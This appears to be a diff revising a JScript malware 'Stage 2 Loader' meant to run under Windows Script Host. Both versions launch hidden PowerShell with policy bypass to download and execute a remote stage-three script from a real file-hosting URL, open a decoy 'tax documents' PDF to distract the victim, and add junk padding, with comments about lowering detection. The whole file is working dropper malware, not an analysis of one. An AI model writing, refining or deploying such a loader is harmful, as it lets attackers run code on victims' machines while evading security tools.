@@ -1,29 +1,29 @@
 // =============================================
-// Minimal Stage 2 Loader - Low Detection
+// Reliable Stage 2 Loader
 // =============================================
 
 (function() {
     try {
         var wsh = new ActiveXObject("WScript.Shell");
 
-        // Stage 3 URL (your working one)
-        var stage3 = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";
+        // Your working Stage 3 URL
+        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";
 
-        // Run Stage 3
-        var cmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3 + '\' -UseBasicParsing).Content"';
-        wsh.Run("powershell.exe " + cmd, 0, false);
+        // More reliable way to run Stage 3
+        var stage3Cmd = '-ep Bypass -WindowStyle Hidden -c "powershell -c \\"Invoke-Expression (irm \'' + stage3Url + '\')\\""';
+        wsh.Run("powershell.exe " + stage3Cmd, 0, false);
 
-        WScript.Sleep(700);
+        WScript.Sleep(900);
 
         // Decoy
-        var decoy = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
-        wsh.Run("powershell.exe " + decoy, 0, false);
+        var decoyCmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\' -UseBasicParsing; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
+        wsh.Run("powershell.exe " + decoyCmd, 0, false);
 
     } catch(e) {}
 
-    // Minimal junk (less suspicious)
-    var junk = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
-    for(var i = 0; i < 85; i++) {
-        junk += junk;
+    // Junk data
+    var junk = "";
+    for(var i = 0; i < 9200000; i++) {
+        junk += "x";
     }
 })();
